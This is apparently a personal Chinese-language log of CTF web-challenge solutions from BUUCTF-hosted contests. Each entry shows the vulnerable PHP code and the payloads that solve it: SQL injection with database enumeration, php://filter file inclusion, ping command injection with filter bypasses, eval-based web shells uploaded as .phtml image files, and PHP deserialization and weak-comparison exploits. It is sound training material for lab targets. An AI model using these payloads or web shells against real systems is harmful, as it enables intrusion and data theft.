# My bad

## 2021/06/30

### EasySQL

> 极客大挑战 2019

#### 题目

题目本身就是把用户输入放进一对单引号之中，想办法闭合单引号即可，无难度

#### payload

```
?username=bme&password=1' or '1'='1
```

## 2021/07/01

### Have fun

> 极客大挑战 2019

#### 题目

题目比较简单，打开页面源码，发现源码也包含在其中，发送Get请求`cat=dog`得到flag

```php
$cat=$_GET['cat'];
echo $cat;
if($cat=='dog'){
    echo 'Syc{cat_cat_cat_cat}';
}
```

#### payload

```
?cat=dog
```

### Include

> ACTF 2020

#### 题目

F12打开源码，发现一个`?file=flag.php`链接，点进去发现啥都没有，那只能先试试**伪协议**文件包含flag.php，得到base64的代码，解码后得到flag

#### payload

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

### Secret File

> 极客大挑战 2019

#### 题目

F12打开源码，发现一个`./Archive_room.php`的链接，点进去有一个**secret**按钮，点进去发现查阅结束，需要用Burp截包，截下数据包发现，有一个**302跳转**，其中包含`secr3t.php`页面，发现源代码。

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```

还是经典的伪协议读取，读取`flag.php`，得到flag

#### payload

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

### Exec

> ACTF 2020

#### 题目

给了一个可以ping的框，F12打开源码，发现是命令执行，直接在框里输入命令绕过`127.0.0.1;ls`，得到目录下文件`index.php`，cat命令阅读源码，`ls`搜索目录发现上层目录中有`flag`文件，获取flag

```php
<?php 
if (isset($_POST['target'])) {
	system("ping -c 3 ".$_POST['target']);
}
?>
```

#### payload

```
127.0.0.1;ls -al /
```

## 2021/07/02

### LoveSQL

> 极客大挑战 2019

#### 题目

从名字就可以看出来，SQL注入的题，进来是个登录页面，随便输一下，Get请求发送`username`和`password`两个参数，从`password`下手试一下万能密码，竟然登录进去了，看起来是要在库里面找东西，还有回显的`username`和`password`，直接注入，比较简单

#### payload

```
?username=1&password=1' union select 1,2,'3

?username=1&password=1' union select 1,database(),'3 // return geek

?username=1&password=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='geek'),'3 //return l0ve1ysq1

?username=1&password=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'),'3 //return id,username,password

?username=1&password=1' union select 1,(select group_concat(password) from l0ve1ysq1),'3 // return flag
```

### Ping Ping Ping

> GXYCTF 2019

#### 题目

还是个ping命令的题，直接上`;ls`，回显出两个文件，直接`cat`读取，被拦截了（），试试绕过，发现很多符号也被过滤了，用命令执行的绕过`$IFS$9`来绕过空格，显示出源码，发现flag被正则表达式包住了，这里采用拼接的形式进行绕过

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

#### payload

```
?ip=;a=g;cat$IFS$9fla$a.php
```

### Knife

> 极客大挑战 2019

#### 题目

题目没啥好说的，直接**蚁剑/菜刀**连就行了

#### payload

### Http

> 极客大挑战 2019

#### 题目

Burp搜索站点，可以发现一个隐藏页面`Secret.php`，访问发现返回`It doesn't come from 'https://www.Sycsecret.com'`，那就添加`Referer`，发现又返回`Please use "Syclover" browser`，改`User-Agent`，发现又返回`No!!! you can only read this locally!!!`，添加`X-Forwarded-For:127.0.0.1`，拿到flag

#### payload

```http
GET /Secret.php HTTP/1.1
Host: node3.buuoj.cn:28969
Referer:https://www.Sycsecret.com
X-Forwarded-For:127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent:Syclover
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a52dafb251c-0133abcdf6c6a9-6373264-384000-17a52dafb261436
Connection: close
```
## 2021/07/06

### Upload

> 极客大挑战 2019

#### 题目

题目是一道上传类型的题目，打开页面就能看到一个上传页面，先随便弄个图片马上去

```php
GIF89a
<?php
	eval($_POST['bme']);
?>
```

直接被拦截，提示我们上传的代码中含有`<?`，看来是有waf的存在，换一种写法

```php
GIF89a
<script language="php">
	eval($_POST['bme']);
</script>
```

但是我们的尾缀名还是`.gif`，要解析还需要`php`格式，所以还要对后缀进行绕过，如`php php3 php4 php5 phtml`，这里采用`phtml`进行绕过，上传好图片马之后，只需要用**蚁剑**去连接就行，路径在`/upload`下

#### payload

```http
POST /upload_file.php HTTP/1.1
Host: f1f6fecf-466a-46c0-b308-aec9bb73266c.node4.buuoj.cn
Content-Length: 344
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://f1f6fecf-466a-46c0-b308-aec9bb73266c.node4.buuoj.cn
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3x6kQ4KShfkzO4oS
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://f1f6fecf-466a-46c0-b308-aec9bb73266c.node4.buuoj.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0
Connection: close

------WebKitFormBoundary3x6kQ4KShfkzO4oS
Content-Disposition: form-data; name="file"; filename="bme.phtml"
Content-Type: image/gif

GIF89a
<script language="php">
	eval($_POST['bme']);
</script>
------WebKitFormBoundary3x6kQ4KShfkzO4oS
Content-Disposition: form-data; name="submit"

鎻愪氦
------WebKitFormBoundary3x6kQ4KShfkzO4oS--
```

### PHP

> 极客大挑战 2019

#### 题目

进网站翻源码，发现啥也没用，有一处关键信息**我有一个良好的备份网站的习惯**，说明这是一个**信息泄露**类型的题目，直接工具/手动翻，常见的包括`.php~ .php.bak .swp .swn .swo www.zip .php.old .php.txt`等等，这里找出来是`www.zip`，下载源码翻一下

```php
// index.php
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
?>
```

```php
// class.php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();     
        }
    }
}
?>
```

```php
// flag.php
<?php
	$flag = 'Syc{dog_dog_dog_dog}';
?>
```

很明显，是一道反序列的化的题目，难点在绕过`__wakeup`，利用`CVE-2016-7124`，属性的个数大于实际个数就能绕过，还有一个问题点，就是反序列化后的字符串，`private`属性是包括不可见字符的，所以在上传的时候，要加上去

#### payload

```php
<?php
include class.php;

$name = new Name('admin',100);
echo serialize($name);

?>

// O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
```

## 2021/07/07

### Upload

> ACTF 2020 新生赛

#### 题目

这个题也是个上传的基本题，利用图片马加`phtml`绕过，会得到上传路径，蚁剑连接即可

#### payload

```http
POST / HTTP/1.1
Host: 44bc62a4-017a-4355-bb9e-9eea2f0ca8c0.node4.buuoj.cn
Content-Length: 327
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://44bc62a4-017a-4355-bb9e-9eea2f0ca8c0.node4.buuoj.cn
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBqT5nlAPBf5GT9T5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://44bc62a4-017a-4355-bb9e-9eea2f0ca8c0.node4.buuoj.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0
Connection: close

------WebKitFormBoundaryBqT5nlAPBf5GT9T5
Content-Disposition: form-data; name="upload_file"; filename="bme.phtml"
Content-Type: image/gif

GIF89a
<?php
eval($_POST['bme']);
?>
------WebKitFormBoundaryBqT5nlAPBf5GT9T5
Content-Disposition: form-data; name="submit"

upload
------WebKitFormBoundaryBqT5nlAPBf5GT9T5--
```

### BackupFile

> ACTF 2020 新生赛

#### 题目

同样是一道**信息泄露**类型的题目，源码在`index.php.bak`

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

我们需要让我们的`key`，绕过`is_numeric`，那我们的`key`就需要为数字，紧接着有一个弱等于`==`，**由于`php`的弱类型特性，导致数字与包含数字内容的字符串比较时，字符串会从头部的数值部分进行截取**，简单来说这里就是`123`

#### payload

```
?key=123
```

### BuyFlag

> 极客大挑战 2019

#### 题目

刚进去的首页没什么有用的信息，主要信息都藏在右上角的`MENU`按钮中的`PAYFLAG`中，页面提供了一些信息

- FLAG NEED YOUR 100000000 MONEY
- You must be a student from CUIT!!!
- You must be answer the correct password!!!

在向下审计，会发现一段代码

```php
<?php
//    ~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```

这里提示我们**POST**`money`和`password`，首先查看代码，意思就是`password`需要被提交一个值（`isset()`），这个值不能为数字类型（`isnumeric()`），同时，这个值需要和`404`弱等于

```http
POST /pay.php HTTP/1.1
Host: 037a92ab-41b4-4066-8aee-a5d7d7d4796b.node4.buuoj.cn
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://037a92ab-41b4-4066-8aee-a5d7d7d4796b.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://037a92ab-41b4-4066-8aee-a5d7d7d4796b.node4.buuoj.cn/pay.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0; user=1
Connection: close

password=404a&money=100000000
```

这里我们让`passwrod=404a`，`money=100000000`，我们还发现cookie中包含一个`user=0`，将他置为1，发送，返回得到`Nember lenth is too long`，说明我们的`money`过长，后台大概率采用`strcmp`函数比较，对于这个函数，数组方法绕过即可

#### payload

```http
POST /pay.php HTTP/1.1
Host: 037a92ab-41b4-4066-8aee-a5d7d7d4796b.node4.buuoj.cn
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://037a92ab-41b4-4066-8aee-a5d7d7d4796b.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://037a92ab-41b4-4066-8aee-a5d7d7d4796b.node4.buuoj.cn/pay.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0; user=1
Connection: close

password=404a&money[]=100000000
```

### Easy MD5

> BJDCTF 2020

#### 题目

进去就是个输入框，别的啥也没有，输入一下试试，在返回包中抓到提示字段`Hint: select * from 'admin' where password=md5($pass,true)`，这说明我们的后台是把我们的输入转换为`md5`，进行比较，这里我们采用一个特殊值`ffifdyop`，这个数进行`md5`之后的值为`276F722736C95D99E921722CF9ED621C`，而MySQL会把`Hex`编码，转为`Ascii`进行使用，而这段代码的`Hex`解码为`'or'6�]��!r,��b`，与前面构成了一个永真式，进行绕过，进入下一部分，阅读源码

```php
<?php
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
// wow, glzjin wants a girl friend.
```

这里是一个**md5弱等于**的问题，**弱等于**会把以`0e`开头作为`0`处理，所以我们只要找出两个`md5`值为`0e`开头的字符串即可，进入下一部分

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
```

这次换为了**强等于**，有两种思路，得到结果

- 找出真正相等的字符串，**md5不安全性**
- 数组绕过

#### payload

```
/?password=ffifdyop
/?a=s878926199a&b=s155964671a
/?param1[]=1&param2[]=2
```

### NiZhuanSiWei

> ZJCTF 2019

#### 题目

进去发现源码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

这里需要上传三个参数`text`，`file`，`password`，`text`需要引入一个包含`welcome to the zjctf`的文件，这里可以采用`php://input`伪协议的方法，或者采用远程引入的方法；`file`参数则是不能包含`flag`，我们看到注释中包含`useless.php`，我们先用`php://filter`伪协议读取`useless.php`的源代码，base64解码；password暂时还没什么利用方向

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

我们读取到了`useless.php`的源代码，现在要利用他来进行我们的反序列化，这时候前面的`password`就派上了用场，因为`Flag`类中，包括我们的`__toString`魔术方法，会在我们把**对象当做字符串使用时调用**，利用我们的`Flag`类进行反序列化拿到flag

#### payload

```http
POST /?text=php://input&file=php://filter/read=convert.base64-encode/resource=useless.php&password=1 HTTP/1.1
Host: 2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn/?text=php://input&file=php://filter/read=conver.base64-encode/resource=useless.php&password=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0
Connection: close

welcome to the zjctf
```

```php
<?php
include useless.php
    
$res = new Flag();
$res->file = 'flag.php';
echo serialize($res);

// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

```http
POST /?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} HTTP/1.1
Host: 2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn
Content-Length: 20
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn/?text=php://input&file=php://filter/read=conver.base64-encode/resource=useless.php&password=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0
Connection: close

welcome to the zjctf
```

